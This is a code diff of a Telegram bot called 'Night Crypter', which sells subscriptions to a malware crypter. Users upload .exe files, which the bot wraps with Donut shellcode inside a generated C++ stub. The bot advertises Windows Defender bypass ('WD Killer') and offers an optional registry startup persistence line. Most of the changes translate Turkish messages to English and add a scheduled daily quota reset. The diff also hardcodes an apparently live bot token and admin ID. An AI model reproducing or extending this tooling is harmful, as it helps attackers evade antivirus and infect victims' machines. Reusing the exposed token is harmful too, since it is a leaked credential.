@@ -1,7 +1,7 @@
-# bot.py (Donut shellcode ile güncellenmiş)
+# bot.py (Updated with Donut shellcode)
 import json
 import os
-from datetime import datetime, timedelta
+from datetime import datetime, timedelta, time
 from typing import Dict, Any, Optional
 import subprocess
 import donut
@@ -19,22 +19,22 @@ from telegram.ext import (
     ConversationHandler,
 )
 
-# ========== AYARLAR ==========
+# ========== SETTINGS ==========
 TOKEN = "8288860382:AAEBxNpEl81cnGKnOmauGEmMm7XkblkePYA"
-ADMIN_ID = 7279467950  # kendi telegram id'n
+ADMIN_ID = 7279467950  # Your Telegram ID
 USERS_FILE = "json/users.json"
 TIMEZONE = "Europe/Istanbul"
 tzinfo = pytz.timezone(TIMEZONE)
 
 warnings.filterwarnings("ignore", category=PTBUserWarning)
 
-# Dosya saklama ayarları
+# File storage settings
 STUBS_DIR = "stubs"
-MAX_FILE_SIZE = 8 * 1024 * 1024  # 8 MB sınırı
+MAX_FILE_SIZE = 8 * 1024 * 1024  # 8 MB limit
 
 # ============================
 
-# ---------- JSON işlemleri ----------
+# ---------- JSON Operations ----------
 def ensure_file(path: str, default):
     folder = os.path.dirname(path)
     if folder and not os.path.exists(folder):
@@ -56,7 +56,7 @@ def save_json(path: str, data) -> None:
     with open(path, "w", encoding="utf-8") as f:
         json.dump(data, f, indent=4, ensure_ascii=False)
 
-# ---------- Kullanıcı işlevleri ----------
+# ---------- User Functions ----------
 def ensure_user_record(user_id: int) -> None:
     users = load_json(USERS_FILE)
     key = str(user_id)
@@ -160,7 +160,8 @@ def increment_crypt_count(user_id: int) -> None:
     users[key]["daily_used"] = used + 1
     save_json(USERS_FILE, users)
 
-def reset_all_daily_used() -> None:
+async def reset_all_daily_used(context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Resets the daily crypt count for all users."""
     users = load_json(USERS_FILE)
     changed = False
     for uid, u in users.items():
@@ -169,8 +170,9 @@ def reset_all_daily_used() -> None:
             changed = True
     if changed:
         save_json(USERS_FILE, users)
+        print("Daily crypt counts have been reset for all users.")
 
-# ---------- Yardımcı: kullanıcı stubs dizini ----------
+# ---------- Helper: User Stubs Directory ----------
 def user_stub_dir(user_id: int) -> str:
     path = os.path.join(STUBS_DIR, str(user_id))
     os.makedirs(path, exist_ok=True)
@@ -185,11 +187,15 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("Profile", callback_data="profile")],
         [InlineKeyboardButton("Plans", callback_data="plans")],
-        [InlineKeyboardButton("Crypter", callback_data="crypter")],
-        [InlineKeyboardButton("Reset Daily (Admin)", callback_data="reset_daily")]
+        [InlineKeyboardButton("Crypter", callback_data="crypter")]
     ]
     reply = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text("🌙 Night Crypter\n\n Sub Seller: @payloadexecuter :", reply_markup=reply)
+
+    banner_path = "assets/banner.png"
+    if os.path.exists(banner_path):
+        await update.message.reply_photo(photo=open(banner_path, 'rb'), caption="🌙 Night Crypter\n\nWelcome! Please select an option from the menu below.", reply_markup=reply)
+    else:
+        await update.message.reply_text("🌙 Night Crypter\n\nWelcome! Please select an option from the menu below.", reply_markup=reply)
 
 async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -202,7 +208,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     users = load_json(USERS_FILE)
     user = users.get(uid)
     if not user:
-        await query.edit_message_text("Kayıt bulunamadı. Lütfen /start komutunu gönder.")
+        await query.edit_message_text("Record not found. Please send /start.")
         return
 
     if data == "profile":
@@ -227,7 +233,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "crypter":
         if has_active_subscription(query.from_user.id):
-            text = "✅ Subscription active (Wd Bypass).\n\nPlease upload your .exe file to encrypt it."
+            text = "✅ Subscription active (WD Bypass).\n\nPlease upload your .exe file to encrypt it."
         else:
             text = "❌ You do not have an active subscription.\n\nPlease contact the admin to purchase one."
 
@@ -235,64 +241,54 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(text, reply_markup=reply)
 
-    elif data == "reset_daily":
-        if query.from_user.id != ADMIN_ID:
-            await query.answer("Yalnızca admin kullanabilir.", show_alert=True)
-            return
-        reset_all_daily_used()
-        keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
-        reply = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text("✅ Tüm kullanıcıların günlük sayacı sıfırlandı.", reply_markup=reply)
-
     elif data == "back":
         keyboard = [
             [InlineKeyboardButton("Profile", callback_data="profile")],
             [InlineKeyboardButton("Plans", callback_data="plans")],
-            [InlineKeyboardButton("Crypter", callback_data="crypter")],
-            [InlineKeyboardButton("Reset Daily (Admin)", callback_data="reset_daily")]
+            [InlineKeyboardButton("Crypter", callback_data="crypter")]
         ]
         reply = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text("🌙 Night Crypter\nMenüden seçim yap:", reply_markup=reply)
+        await query.edit_message_text("🌙 Night Crypter\n\nWelcome! Please select an option from the menu below.", reply_markup=reply)
 
-# ---------- Admin ve Kullanıcı Komutları ----------
+# ---------- Admin and User Commands ----------
 async def grant_a_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("Yalnızca admin kullanabilir.")
+        await update.message.reply_text("Only the admin can use this command.")
         return
     args = context.args
     if len(args) < 2:
-        await update.message.reply_text("Kullanım: /grant_a <user_id> <days>")
+        await update.message.reply_text("Usage: /grant_a <user_id> <days>")
         return
     try:
         target = int(args[0])
         days = int(args[1])
     except ValueError:
-        await update.message.reply_text("user_id ve days integer olmalı.")
+        await update.message.reply_text("user_id and days must be integers.")
         return
     if set_expiry(target, "a", days):
         expiry = load_json(USERS_FILE)[str(target)]["a_expiry"]
-        await update.message.reply_text(f"A planı verildi -> {target} expiry: {expiry}")
+        await update.message.reply_text(f"Plan A granted -> {target} expiry: {expiry}")
         try:
-            await context.bot.send_message(target, f"🎉 Sana A (Wd Killer) planı verildi. Expiry: {expiry}")
+            await context.bot.send_message(target, f"🎉 You have been granted Plan A (WD Killer). Expiry: {expiry}")
         except Exception:
             pass
 
 
 async def set_daily_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("Yalnızca admin kullanabilir.")
+        await update.message.reply_text("Only the admin can use this command.")
         return
     if len(context.args) < 2:
-        await update.message.reply_text("Kullanım: /set_daily <user_id> <limit>")
+        await update.message.reply_text("Usage: /set_daily <user_id> <limit>")
         return
     try:
         target = int(context.args[0])
         limit = int(context.args[1])
     except ValueError:
-        await update.message.reply_text("user_id ve limit integer olmalı.")
+        await update.message.reply_text("user_id and limit must be integers.")
         return
     set_daily_limit(target, limit)
-    await update.message.reply_text(f"User {target} daily limit {limit} olarak ayarlandı.")
+    await update.message.reply_text(f"User {target}'s daily limit has been set to {limit}.")
 
 
 # Conversation states
@@ -395,7 +391,7 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
         if startup:
             # Note: The C++ string literal for the registry key requires double backslashes
             # The app name needs to be in escaped quotes
-            startup_line = f'char currentPath[MAX_PATH]; GetModuleFileName(NULL, currentPath, MAX_PATH); addToStartup(\"{app_name_for_registry}\", currentPath);'
+            startup_line = f'char currentPath[MAX_PATH]; GetModuleFileName(NULL, currentPath, MAX_PATH); addToStartup(\\"{app_name_for_registry}\\", currentPath);'
 
         cpp_template = f'''
 #include <windows.h>
@@ -469,16 +465,21 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     return ConversationHandler.END
 
 
-# ---------- Hata handler ----------
+# ---------- Error Handler ----------
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
-    print("Hata:", context.error)
+    print("Error:", context.error)
 
 
-# =========== Başlat ===========
+# =========== Main Start ===========
 def main():
     ensure_file(USERS_FILE, {})
 
     app = Application.builder().token(TOKEN).build()
+
+    # Schedule the daily reset job
+    job_queue = app.job_queue
+    reset_time = time(hour=0, minute=0, second=0, tzinfo=tzinfo)
+    job_queue.run_daily(reset_all_daily_used, time=reset_time, name="daily_reset_job")
 
     conv_handler = ConversationHandler(
         entry_points=[MessageHandler(filters.Document.ALL, file_upload_handler)],
@@ -497,11 +498,12 @@ def main():
     app.add_handler(CommandHandler("set_daily", set_daily_cmd))
 
     app.add_error_handler(error_handler)
-    TeleText = """
+
+    banner_text = """
     ---------------------------------------
-       Night Crypter ( Tele Bot )
+       Night Crypter (Telegram Bot)
     
-    - 28.09.2025 - All Rights Reversed.
+    - 28.09.2025 - All Rights Reserved.
     
     - Made By Payload X Violent
     
@@ -510,7 +512,8 @@ def main():
     - Socials [ Tg: t.me/NightCrypter ]
     ---------------------------------------
     """
-    print(TeleText)
+    print(banner_text)
+
     app.run_polling()
 
 if __name__ == "__main__":
